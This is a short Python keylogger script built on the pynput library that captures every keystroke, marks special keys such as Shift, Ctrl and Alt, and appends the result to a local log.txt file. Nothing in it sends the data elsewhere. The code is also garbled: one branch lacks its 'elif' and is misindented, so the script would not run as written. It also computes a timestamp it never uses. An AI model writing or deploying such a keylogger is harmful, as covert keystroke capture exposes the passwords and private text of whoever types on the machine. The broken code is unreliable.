#important to add this module by pip install
from pynput.keyboard import Listener
import datetime

# Keep track of shift state for capturing capital letters
shift_pressed = False

def write_to_file(key):
    global shift_pressed
    letter = str(key)
#for removing default ' easy understanding
    letter = letter.replace("'", "")

# Add timestamp
    timestamp = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    
#some changes and many more for understanding logs better 
    if letter == 'Key.space':
        letter = ' '
    elif letter == 'Key.shift_r' or letter == 'Key.shift':
        shift_pressed = True
        letter = ''
    elif letter == 'Key.backspace':
        letter = '<.<'
letter == 'Key.ctrl_l' or letter == 'Key.ctrl_r':
        letter = '[CTRL]'
    elif letter == 'Key.alt_l' or letter == 'Key.alt_r':
        letter = '[ALT]'
    if shift_pressed and letter.isalpha():
        letter = letter.upper()  # Capitalize letters if SHIFT is pressed
        shift_pressed = False  # Reset shift state

    with open("log.txt", 'a') as f:
        f.write(letter)
    
with Listener(on_press=write_to_file) as l:
    l.join()
